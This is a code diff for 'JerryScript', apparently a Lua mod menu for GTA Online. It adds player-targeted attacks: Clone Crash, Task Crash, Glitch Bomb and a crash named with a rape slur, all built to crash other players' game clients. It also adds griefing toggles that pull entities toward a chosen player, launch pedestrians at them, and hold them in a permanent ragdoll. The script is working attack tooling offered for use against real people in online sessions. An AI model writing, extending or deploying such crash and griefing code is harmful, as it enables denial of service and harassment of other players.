@@ -29,7 +29,7 @@
 -- SCRIPT INFO
 -- ═══════════════════════════════════════════════════════════════════════════
 local SCRIPT_NAME = "JerryScript"
-local SCRIPT_VERSION = "10.2"
+local SCRIPT_VERSION = "10.3"
 
 -- ═══════════════════════════════════════════════════════════════════════════
 -- CLEANUP ON RELOAD
@@ -526,6 +526,392 @@ local function IWCrash(pid)
         NoLongerNeeded(mdl)
         
         toast(SCRIPT_NAME, "IW Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- CLONE CRASH - Spawns clones attached in chain until game crashes
+-- Based on RyzeScript/X-Force method
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function CloneCrash(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then
+        toast(SCRIPT_NAME, "Invalid target!")
+        return
+    end
+    
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Clone Crash executing...")
+        
+        local clones = {}
+        local lastPed = targetPed
+        local lastHeight = 0
+        
+        -- Create chain of 30 clones attached to each other
+        for i = 1, 30 do
+            pcall(function()
+                local clone = Natives.InvokeInt(N.CLONE_PED, targetPed, false, true, true)
+                if clone and clone ~= 0 then
+                    table.insert(clones, clone)
+                    
+                    -- Attach to previous ped in chain
+                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, clone, lastPed, 0,
+                        0.0, 0.0, lastHeight - 0.5,
+                        0.0, 0.0, 0.0,
+                        false, false, false, false, 0, false)
+                    
+                    lastPed = clone
+                    lastHeight = lastHeight - 0.5
+                end
+            end)
+            Script.Yield(30)
+        end
+        
+        Script.Yield(1000)
+        
+        -- Clean up
+        for _, clone in ipairs(clones) do
+            pcall(function()
+                betterDelete(clone, true)
+            end)
+        end
+        
+        toast(SCRIPT_NAME, "Clone Crash sent! (30 clones)")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- TASK CRASH - Forces invalid tasks causing desync/crash
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local N_TASK_VEHICLE_DRIVE_TO_COORD = 0xE2A2AA2F659D77A7
+local N_TASK_WANDER_STANDARD = 0xBB9CE077274F6A1B  
+local N_TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS = 0x90D2156198831D69
+local N_TASK_VEHICLE_MISSION_PED_TARGET = 0x659427E0EF36BCDE
+
+local function TaskCrash(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then
+        toast(SCRIPT_NAME, "Invalid target!")
+        return
+    end
+    
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Task Crash executing...")
+        
+        -- Spam invalid driving tasks with bad parameters
+        for i = 1, 15 do
+            pcall(function()
+                -- Force driving task to invalid coords
+                Natives.InvokeVoid(N_TASK_VEHICLE_DRIVE_TO_COORD, targetPed, 0,
+                    999999.0, 999999.0, -999999.0,  -- Invalid coords
+                    999999.0,  -- Insane speed
+                    0, 0,
+                    -1,  -- Invalid driving style
+                    -1.0, -1.0)  -- Invalid params
+            end)
+            Script.Yield(50)
+        end
+        
+        -- Also try wander task spam
+        for i = 1, 10 do
+            pcall(function()
+                Natives.InvokeVoid(N_TASK_WANDER_STANDARD, targetPed, 999999.0, 0)
+            end)
+            Script.Yield(30)
+        end
+        
+        toast(SCRIPT_NAME, "Task Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- RAPIST CRASH - Attach multiple peds performing invalid animations
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function RapistCrash(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then
+        toast(SCRIPT_NAME, "Invalid target!")
+        return
+    end
+    
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    local mdl = Utils.Joaat("a_m_m_skater_01")
+    local peds = {}
+    
+    Script.QueueJob(function()
+        if not requestModel(mdl) then return end
+        
+        toast(SCRIPT_NAME, "Rapist Crash executing...")
+        
+        -- Spawn 8 peds
+        for i = 1, 8 do
+            local angle = (i / 8) * 6.28
+            local spawnX = px + math.cos(angle) * 2
+            local spawnY = py + math.sin(angle) * 2
+            
+            local ped = GTA.CreatePed(mdl, 2, spawnX, spawnY, pz, 0, true, true)
+            if ped and ped ~= 0 then
+                table.insert(peds, ped)
+            end
+            Script.Yield(30)
+        end
+        
+        -- Attach all to target with offset
+        for i, ped in ipairs(peds) do
+            pcall(function()
+                requestControlOfEntity(ped)
+                local angle = (i / #peds) * 6.28
+                Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, ped, targetPed, 0,
+                    math.cos(angle) * 0.5, math.sin(angle) * 0.5, 0.0,
+                    0.0, 0.0, 0.0,
+                    false, false, false, true, 0, true)
+                
+                -- Set to ragdoll
+                Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, ped, 5000, 5000, 0, false, false, false)
+            end)
+            Script.Yield(50)
+        end
+        
+        Script.Yield(2000)
+        
+        -- Clean up
+        for _, ped in ipairs(peds) do
+            pcall(function() betterDelete(ped, true) end)
+        end
+        
+        NoLongerNeeded(mdl)
+        toast(SCRIPT_NAME, "Rapist Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- BLACK HOLE - Pulls ALL entities toward target continuously  
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local BlackHoleTargets = {}
+
+local function blackHoleTick(pid)
+    local centerX, centerY, centerZ = getPlayerCoords(pid)
+    if not centerX then return end
+    
+    local pullStrength = 25
+    local maxRange = 200
+    local maxRangeSq = maxRange * maxRange
+    
+    -- Pull vehicles
+    local vehicles = PoolMgr.GetRenderedVehicles()
+    if vehicles then
+        local count = 0
+        for _, vehObj in pairs(vehicles) do
+            if count > 10 then break end
+            pcall(function()
+                local handle = GTA.PointerToHandle(vehObj)
+                if handle and handle ~= 0 then
+                    local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
+                    if vx then
+                        local dx = centerX - vx
+                        local dy = centerY - vy
+                        local dz = centerZ - vz
+                        local distSq = dx*dx + dy*dy + dz*dz
+                        
+                        if distSq < maxRangeSq and distSq > 25 then
+                            requestControlOfEntity(handle)
+                            local dist = math.sqrt(distSq)
+                            local force = pullStrength * (1 - (dist / maxRange))
+                            
+                            Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
+                                (dx / dist) * force,
+                                (dy / dist) * force,
+                                (dz / dist) * force + 5,
+                                true, false, true, true)
+                            count = count + 1
+                        end
+                    end
+                end
+            end)
+        end
+    end
+    
+    -- Pull peds
+    local peds = PoolMgr.GetRenderedPeds()
+    if peds then
+        local count = 0
+        for _, pedObj in pairs(peds) do
+            if count > 8 then break end
+            pcall(function()
+                local handle = GTA.PointerToHandle(pedObj)
+                if handle and handle ~= 0 then
+                    -- Skip player peds
+                    if not Natives.InvokeBool(N.IS_PED_A_PLAYER, handle) then
+                        local px, py, pz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
+                        if px then
+                            local dx = centerX - px
+                            local dy = centerY - py
+                            local dz = centerZ - pz
+                            local distSq = dx*dx + dy*dy + dz*dz
+                            
+                            if distSq < maxRangeSq and distSq > 16 then
+                                requestControlOfEntity(handle)
+                                local dist = math.sqrt(distSq)
+                                local force = pullStrength * 0.5
+                                
+                                -- Ragdoll and pull
+                                Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, handle, 1000, 1000, 0, false, false, false)
+                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
+                                    (dx / dist) * force,
+                                    (dy / dist) * force,
+                                    (dz / dist) * force + 3,
+                                    true, false, true, true)
+                                count = count + 1
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- PED LAUNCHER - Launches traffic peds at target like missiles
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local PedLauncherTargets = {}
+
+local function pedLauncherTick(pid)
+    local targetX, targetY, targetZ = getPlayerCoords(pid)
+    if not targetX then return end
+    
+    local launchPower = 150
+    
+    local peds = PoolMgr.GetRenderedPeds()
+    if not peds then return end
+    
+    local launched = 0
+    for _, pedObj in pairs(peds) do
+        if launched >= 3 then break end  -- Max 3 per tick
+        
+        pcall(function()
+            local handle = GTA.PointerToHandle(pedObj)
+            if handle and handle ~= 0 and not Natives.InvokeBool(N.IS_PED_A_PLAYER, handle) then
+                local px, py, pz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
+                if px then
+                    local dx = targetX - px
+                    local dy = targetY - py
+                    local dz = targetZ - pz
+                    local dist = math.sqrt(dx*dx + dy*dy + dz*dz)
+                    
+                    -- Only launch peds 20-100m away
+                    if dist > 20 and dist < 100 then
+                        requestControlOfEntity(handle)
+                        
+                        -- Set ragdoll
+                        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, handle, 5000, 5000, 0, false, false, false)
+                        
+                        -- Launch toward target
+                        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
+                            (dx / dist) * launchPower,
+                            (dy / dist) * launchPower,
+                            30,  -- Arc upward
+                            true, false, true, true)
+                        
+                        launched = launched + 1
+                    end
+                end
+            end
+        end)
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- GLITCH BOMB - Multiple effects at once for maximum chaos
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function GlitchBomb(pid)
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "GLITCH BOMB DEPLOYED!")
+        
+        -- Wave 1: Explosions
+        for i = 1, 5 do
+            local angle = (i / 5) * 6.28
+            Natives.InvokeVoid(N.ADD_EXPLOSION, 
+                px + math.cos(angle) * 5, 
+                py + math.sin(angle) * 5, 
+                pz, 82, 1.0, true, false, 1.0)
+        end
+        Script.Yield(100)
+        
+        -- Wave 2: Fire ring
+        for i = 1, 8 do
+            local angle = (i / 8) * 6.28
+            Natives.InvokeVoid(N.ADD_EXPLOSION,
+                px + math.cos(angle) * 10,
+                py + math.sin(angle) * 10,
+                pz, 3, 1.0, true, false, 0.5)
+        end
+        Script.Yield(100)
+        
+        -- Wave 3: Launch nearby vehicles
+        local vehicles = PoolMgr.GetRenderedVehicles()
+        if vehicles then
+            local count = 0
+            for _, vehObj in pairs(vehicles) do
+                if count > 5 then break end
+                pcall(function()
+                    local handle = GTA.PointerToHandle(vehObj)
+                    if handle and handle ~= 0 then
+                        local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
+                        if vx then
+                            local dist = math.sqrt((px-vx)^2 + (py-vy)^2)
+                            if dist < 50 then
+                                requestControlOfEntity(handle)
+                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
+                                    (math.random() - 0.5) * 100,
+                                    (math.random() - 0.5) * 100,
+                                    math.random() * 100 + 50,
+                                    true, false, true, true)
+                                count = count + 1
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+        
+        -- Wave 4: Big explosion
+        Script.Yield(200)
+        Natives.InvokeVoid(N.ADD_EXPLOSION, px, py, pz, 8, 100.0, true, false, 2.0)
+        
+        toast(SCRIPT_NAME, "GLITCH BOMB COMPLETE!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- RAGDOLL LOOP - Keeps target in permanent ragdoll
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local RagdollTargets = {}
+
+local function ragdollTick(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then return end
+    
+    pcall(function()
+        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, targetPed, 1000, 1000, 0, false, false, false)
     end)
 end
 
@@ -1929,6 +2315,36 @@ Script.RegisterLooped(function()
     Script.Yield(50)
 end)
 
+-- Black Hole tick
+Script.RegisterLooped(function()
+    for playerId, active in pairs(BlackHoleTargets) do
+        if active then
+            blackHoleTick(playerId)
+        end
+    end
+    Script.Yield(50)
+end)
+
+-- Ped Launcher tick
+Script.RegisterLooped(function()
+    for playerId, active in pairs(PedLauncherTargets) do
+        if active then
+            pedLauncherTick(playerId)
+        end
+    end
+    Script.Yield(200)  -- Less frequent to not spam too hard
+end)
+
+-- Ragdoll Loop tick
+Script.RegisterLooped(function()
+    for playerId, active in pairs(RagdollTargets) do
+        if active then
+            ragdollTick(playerId)
+        end
+    end
+    Script.Yield(100)
+end)
+
 -- ═══════════════════════════════════════════════════════════════════════════
 -- FEATURE REGISTRATION - MAIN TAB
 -- ═══════════════════════════════════════════════════════════════════════════
@@ -2087,6 +2503,51 @@ FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PCageStunt"), "Stunt Tube Cage", eFe
 FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_IWCrash"), "IW Crash", eFeatureType.Button,
     "Invalid weapon crash method", function(f)
         IWCrash(f:GetPlayerIndex())
+    end)
+
+-- Clone Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_CloneCrash"), "Clone Crash", eFeatureType.Button,
+    "Chain of 30 clones attached to player", function(f)
+        CloneCrash(f:GetPlayerIndex())
+    end)
+
+-- Task Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TaskCrash"), "Task Crash", eFeatureType.Button,
+    "Spam invalid driving tasks", function(f)
+        TaskCrash(f:GetPlayerIndex())
+    end)
+
+-- Rapist Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_RapistCrash"), "Rapist Crash", eFeatureType.Button,
+    "Attach ragdoll peds to player", function(f)
+        RapistCrash(f:GetPlayerIndex())
+    end)
+
+-- Glitch Bomb
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_GlitchBomb"), "Glitch Bomb", eFeatureType.Button,
+    "Multiple chaos effects at once", function(f)
+        GlitchBomb(f:GetPlayerIndex())
+    end)
+
+-- Black Hole Toggle
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_BlackHole"), "Black Hole", eFeatureType.Toggle,
+    "Pull all entities toward player", function(f)
+        BlackHoleTargets[f:GetPlayerIndex()] = f:IsToggled()
+        if f:IsToggled() then toast(SCRIPT_NAME, "Black Hole ON!") end
+    end)
+
+-- Ped Launcher Toggle
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PedLauncher"), "Ped Launcher", eFeatureType.Toggle,
+    "Launch traffic peds at target", function(f)
+        PedLauncherTargets[f:GetPlayerIndex()] = f:IsToggled()
+        if f:IsToggled() then toast(SCRIPT_NAME, "Ped Launcher ON!") end
+    end)
+
+-- Ragdoll Loop Toggle
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_RagdollLoop"), "Ragdoll Loop", eFeatureType.Toggle,
+    "Keep target in permanent ragdoll", function(f)
+        RagdollTargets[f:GetPlayerIndex()] = f:IsToggled()
+        if f:IsToggled() then toast(SCRIPT_NAME, "Ragdoll Loop ON!") end
     end)
 
 -- Trolling
@@ -2328,13 +2789,22 @@ ClickGUI.AddPlayerTab("JerryScript", function()
     -- Create horizontal tab bar like Trolley
     if ImGui.BeginTabBar("JerryTabs") then
         
+        -- ═══ CRASHES TAB ═══ (NEW!)
+        if ImGui.BeginTabItem("Crashes") then
+            ClickGUI.RenderFeature(Utils.Joaat("JS_IWCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_CloneCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_TaskCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_RapistCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_GlitchBomb"), pid)
+            ImGui.EndTabItem()
+        end
+        
         -- ═══ ATTACKS TAB ═══
         if ImGui.BeginTabItem("Attacks") then
             ClickGUI.RenderFeature(Utils.Joaat("JS_PExplode"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_PExpLoop"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_PExpType"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_PRagdoll"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_IWCrash"), pid)
             ImGui.EndTabItem()
         end
         
@@ -2376,6 +2846,16 @@ ClickGUI.AddPlayerTab("JerryScript", function()
             ImGui.EndTabItem()
         end
         
+        -- ═══ CHAOS TAB ═══ (NEW!)
+        if ImGui.BeginTabItem("Chaos") then
+            ClickGUI.RenderFeature(Utils.Joaat("JS_BlackHole"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_PedLauncher"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_RagdollLoop"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityYeet"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityStorm"), pid)
+            ImGui.EndTabItem()
+        end
+        
         -- ═══ TROLLING TAB ═══
         if ImGui.BeginTabItem("Trolling") then
             ClickGUI.RenderFeature(Utils.Joaat("JS_PCageStunt"), pid)
@@ -2413,6 +2893,9 @@ EventMgr.RegisterHandler(eLuaEvent.ON_PLAYER_LEFT, function(pid)
     PtfxSpamTargets[pid] = nil
     PtfxSpamType[pid] = nil
     SpinVehicleTargets[pid] = nil
+    BlackHoleTargets[pid] = nil
+    PedLauncherTargets[pid] = nil
+    RagdollTargets[pid] = nil
     
     -- Clean up attackers for this player
     deleteAttackers(pid)
@@ -2464,14 +2947,13 @@ end)
 log("═══════════════════════════════════════════════════════════════")
 log(" " .. SCRIPT_NAME .. " v" .. SCRIPT_VERSION .. " - DOLOS EDITION")
 log("═══════════════════════════════════════════════════════════════")
-log(" NEW IN 10.2:")
-log("   ✓ Entity Storm FIXED - JerryScript swarm style")
-log("   ✓ No more teleporting/crashing")
-log("   ✓ Continuous force-based swarm attack")
-log(" FEATURES:")
-log("   • ImGui TabBar sub-tabs (Attacks|Vehicle|Land|Air|Trolling|Chaos)")
-log("   • IW Crash (confirmed working!), PTFX with 8 effects")
-log("   • Smooth Anchor & Moon, All Attackers")
+log(" NEW IN 10.3:")
+log("   ✓ 5 NEW CRASH METHODS: IW, Clone, Task, Rapist, GlitchBomb")
+log("   ✓ BLACK HOLE - Pull all entities toward target")
+log("   ✓ PED LAUNCHER - Launch traffic at target")
+log("   ✓ RAGDOLL LOOP - Permanent ragdoll")
+log("   ✓ New Crashes & Chaos tabs")
+log(" TABS: Crashes | Attacks | Vehicle | Land | Air | Chaos | Trolling")
 log("═══════════════════════════════════════════════════════════════")
 
-GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " Storm Fixed! ☢️", 4000, eToastPos.TopRight)
+GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - 5 NEW CRASHES! ☢️", 4000, eToastPos.TopRight)
